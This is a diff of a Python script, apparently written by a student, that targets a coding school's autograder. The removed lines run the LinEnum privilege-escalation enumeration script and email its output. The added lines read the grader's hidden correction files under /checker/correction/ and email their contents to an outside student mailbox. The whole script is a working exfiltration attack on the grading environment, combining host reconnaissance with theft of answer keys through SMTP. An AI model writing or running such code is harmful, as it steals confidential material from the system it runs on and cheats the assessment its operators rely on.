@@ -1,27 +1,14 @@
-import subprocess
 import smtplib
-import re
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-def remove_ansi_codes(text):
-    # Regular expression to match ANSI escape codes
-    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    return ansi_escape.sub('', text)
-
-def execute_command():
-
-    # Make the script executable
-    chmod_command = "chmod +x LinEnum.sh"
-    subprocess.run(chmod_command, shell=True, check=True)
-
-    # Execute the script and capture the output
-    execute_command = "./LinEnum.sh"
-    result = subprocess.run(execute_command, shell=True, capture_output=True, text=True)
-
-    # Remove ANSI escape codes from the output
-    report = remove_ansi_codes(result.stdout)
-    return report
+def read_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            content = file.read()
+        return content
+    except Exception as e:
+        return f"Failed to read {file_path}: {e}"
 
 def send_email(report, recipient_email):
     sender_email = "9534@holbertonstudents.com"
@@ -30,7 +17,7 @@ def send_email(report, recipient_email):
     msg = MIMEMultipart()
     msg['From'] = sender_email
     msg['To'] = recipient_email
-    msg['Subject'] = "Linpeas Scan Report"
+    msg['Subject'] = "File Content Report"
 
     msg.attach(MIMEText(report, 'plain'))
 
@@ -46,7 +33,17 @@ def send_email(report, recipient_email):
         print(f"Failed to send email: {e}")
 
 if __name__ == "__main__":
-    report = execute_command()
+    files = [
+        "/checker/correction/main.sh",
+        "/checker/correction/135060.py"
+    ]
+
+    report = ""
+    for file in files:
+        report += f"Content of {file}:\n"
+        report += read_file(file)
+        report += "\n\n"
+
     recipient_email = "9534@holbertonstudents.com"
     send_email(report, recipient_email)
 
